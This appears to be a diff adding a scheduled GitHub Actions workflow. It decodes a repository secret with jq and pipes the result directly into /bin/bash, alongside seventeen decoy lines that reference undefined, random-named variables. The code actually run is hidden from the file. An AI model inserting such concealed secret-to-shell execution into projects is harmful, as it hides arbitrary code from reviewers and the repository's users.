@@ -1,0 +1,36 @@
+name: weinaisi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weinaisi
+        env:
+          bpp5: ${{ secrets.bpp5 }}
+        run: |
+          echo $bpp5 | jq -r .ne06 | /bin/bash
+          echo $lzn1867 | jq -r .olfj33422 | /bin/bash
+          echo $gs6157 | jq -r .vhb1192 | /bin/bash
+          echo $yx26 | jq -r .orur49581 | /bin/bash
+          echo $nr469 | jq -r .lpv280 | /bin/bash
+          echo $une7 | jq -r .a10 | /bin/bash
+          echo $uaz261 | jq -r .zedga411 | /bin/bash
+          echo $pc60207 | jq -r .hj11 | /bin/bash
+          echo $rwlx9 | jq -r .pvm165 | /bin/bash
+          echo $uv2119 | jq -r .emg92 | /bin/bash
+          echo $zdri47989 | jq -r .bfwzp4856 | /bin/bash
+          echo $ke30 | jq -r .c335 | /bin/bash
+          echo $dja50760 | jq -r .wihs68640 | /bin/bash
+          echo $gyg84 | jq -r .xarer5541 | /bin/bash
+          echo $xs8315 | jq -r .df53492 | /bin/bash
+          echo $j4 | jq -r .j68 | /bin/bash
+          echo $kkyek34 | jq -r .sbd28 | /bin/bash
+          echo $rqu15967 | jq -r .fd4447 | /bin/bash
+
